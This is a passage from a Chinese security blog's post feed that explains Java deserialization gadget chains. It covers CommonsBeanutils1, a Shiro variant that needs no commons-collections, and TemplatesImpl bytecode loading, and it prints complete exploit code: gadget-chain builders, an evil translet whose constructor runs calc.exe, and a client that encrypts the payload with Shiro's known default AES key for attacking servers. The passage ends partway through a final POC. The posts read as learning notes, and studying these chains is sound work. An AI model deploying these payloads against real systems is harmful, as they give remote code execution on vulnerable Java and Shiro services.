alt="image-20221206173016563"></p><p>在4.1和3.2.2更新了<code>FunctorUtils#checkUnsafeSerialization</code>，3.2.2默认情况下会检测常见危险transformer(InstantiataTransformer、InvokerTransformer、PrototypeFactory等)的readObject进行调用，4.1这几个类直接不再实现Serilalizable接口</p><h1 id="CommonsBeanutil"><a href="#CommonsBeanutil" class="headerlink" title="CommonsBeanutil"></a>CommonsBeanutil</h1><p>javaBean的介绍：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p><p>从中可以了解到getter、setter、属性的概念。</p><p>在上文，我们用<code>PriorityQueue#compare()</code>来触发<code>TransformingComparator#transform()</code>。除了这种方式外，还有<code>org.apache.commons.beanutils.BeanComparator.compare()</code></p><p>BeanComparator.compare()方法代码如下：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206184052378.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206184052378.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206184052378"></p><p>其中的getProperty方法可以调用任意javaBean的getter方法（形如<code>getName</code>)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1,<span class="built_in">this</span>.property);</span><br></pre></td></tr></table></figure><p>该方法甚至可以递归查询:<code>PropertyUtils.getProperty(o1,&quot;o2.name&quot;);</code></p><p>现在反序列化链为：</p><p><code>BeanComparator#compara()</code>-&gt;<code>PropertyUtils.getProperty()</code>-&gt; <code>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</code></p><p><code>getOutputProperties()</code>符合getter的定义，所以property(属性名)的值为OutputProperties时，触发反序列化链。PriorityQueue队列和property的值可以用反射的方式修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206210050408.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206210050408.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221206210050408"></p><p>那么这条链跟上面那个只用到了priorityQueue的区别在哪？</p><p>好像只是反序列化的入口从newInstance变成了getOutputProperties？</p><p>正是因为不再需要newInstance作为入口，也就不再需要Invokertransformer进行调用。也就是</p><p><code>PriorityQueue#Compare()</code>-&gt;<code>TransformingComparator#transform</code>-&gt;<code>InvokerTransformer</code>-&gt;<code>TemplatesImpl#newTransformer()</code>这段过程可以全部舍弃掉，转而换成：</p><p><code>PriorityQueue#compare()</code>-&gt;<code>BeanComparator#compare()</code>-&gt;<code>PropertyUtils.getProperty()</code>-&gt; <code>TemplatesImpl#getOutputProperties()</code></p><p>因此3.2.2和4.1就能开心的拿着这个payload去打</p><h2 id="不需要CC库的shiroCommonBeanutils"><a href="#不需要CC库的shiroCommonBeanutils" class="headerlink" title="不需要CC库的shiroCommonBeanutils"></a>不需要CC库的shiroCommonBeanutils</h2><p>shiro本身依赖commons-beautils库。所以上面的payload可以直接改造用来打shiro。</p><blockquote><p>如果本地commons-beanutils和服务器shiro的CB版本不一样的话，serialVersionUID就会不同，也就不兼容。也就是打的时候需要把本地commons-beanutils改成和服务器一样的版本</p></blockquote><p>那服务端没有commons-collections库的时候呢？</p><p>在new BeanComparator时，BeanComparator构造函数使用了ComparableComparator</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113456298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113456298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221207113456298"></p><p>而这个类来自commons.collections，所以要避开使用这个缺省参数。也就是要找到一个类有comparator接口和serializable接口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113534550.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207113534550.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221207113534550"></p><p><code>CaseInsensitiveComparator</code>不仅实现了上面两个接口，还在java.lang.String下。而且用getOutputProperties的方式调用是不需要用到恶意comparator的，只需要恶意property</p><p>所以修改Beancomparator初始化时的参数为CaseInsensitiveComparator的对象就行了：</p><p><code>final BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</code></p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"><span class="comment">// ==================</span></span><br><span class="line"><span class="comment">// 生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转字节码打shiro poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Clientattack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(org.example.ShiroCommonsBeanutils1.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">CommonsCollectionsShiro</span>().getPayload(clazz.toBytecode());</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125223110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125223110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221207125223110"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125113917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207125113917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221207125113917"></p><p>参考：phith0n《java安全漫谈(16、17)》</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC2 </tag>
            
            <tag> shiroCommonBeanutils </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_TemplatesImpl在BCEL和shiro中的利用</title>
      <link href="/2022/10/07/java-templatesimpl-zai-bcel-he-shiro-zhong-de-li-yong/"/>
      <url>/2022/10/07/java-templatesimpl-zai-bcel-he-shiro-zhong-de-li-yong/</url>
      
        <content type="html"><![CDATA[<p>URLClassLoader可以从远程HTTP服务器上加载.class文件，从而执行任意代码。</p><h1 id="JAVA-Classloader"><a href="#JAVA-Classloader" class="headerlink" title="JAVA Classloader"></a>JAVA Classloader</h1><p>字节码的本质是一个字节数组byte[]</p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>加载class或者jar文件，都会经过ClassLoader加载器的loadClass本地寻找类,findClass远程加载类，defineClass处理字节码，从而变成真正的java类。</p><p>因为defineClass被调用时，类对象不会被初始化，只有被显式调用构造函数时才能初始化。而且defineClass是protect类型，所以使用反射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClass.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="TemplateSImpl"><a href="#TemplateSImpl" class="headerlink" title="TemplateSImpl"></a>TemplateSImpl</h2><blockquote><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></blockquote><p>defineClass作用域不开放，所以一般不直接使用。但有一些例外，比如TemplateSImpl。(类方法很少会调用到除public外的方法)，该类的内部类TransletClassLoader重写了defineClass方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java声明方法默认default，能被外部调用。而调用到TransletClassLoader为下列调用链。</p><p><code>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt; TransletClassLoader#defineClass()</code></p><p>使用到defineTransletClasses的其实有<code>getTransletInstance、getTransletClasses、getTransletIndex</code>三种，但是getTransletInstance生成的对象会被包含于Transformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129172318916.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129172318916.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221129172318916"></p><p>最后两个getOutputProperties()和newTransformer都是public类，所以可以略去最后一步直接newTransformer()实现.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> is.readFields();</span><br><span class="line">        _name = (String)gf.get(<span class="string">&quot;_name&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _bytecodes = (<span class="type">byte</span>[][])gf.get(<span class="string">&quot;_bytecodes&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _class = (Class[])gf.get(<span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _transletIndex = gf.get(<span class="string">&quot;_transletIndex&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        _outputProperties = (Properties)gf.get(<span class="string">&quot;_outputProperties&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _indentNumber = gf.get(<span class="string">&quot;_indentNumber&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure><ul><li>在TemplatesImpl的readObject序列化中可以看到<code>_name,_bytecodes,_class,_transletIndex,_outputProperties,_indentNumer,_tfactory</code>都需要设置值进行初始化，但是有些不影响后续利用的不用管，只用设置<code>_name</code>为任意字符串，<code>_bytecode</code>为恶意字节码数组，<code>_tfactory.get</code>为TransformerFactoryImpl对象。</li></ul><p>由于是私有属性，需要用到反射<code>obj.getClass().getDeclaredField()</code>修改属性值</p><ul><li>该TemplatesImpl加载的字节码必须为AbstractTranslet子类，因为defineTransletClasses里会对传入类进行一次判断</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">  _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if this is the main class</span></span><br><span class="line">  <span class="comment">// ABSTRACT_TRANSLET指com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类</span></span><br><span class="line">  <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">      _transletIndex = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以构造一个特殊类,用来弹计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用extends继承AbstractTranslet类可以用super显式调用父类构造方法，super()即是指定无参构造函数。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129212417331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129212417331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221129212417331"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130131858524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130131858524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130131858524"></p><p>完整POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    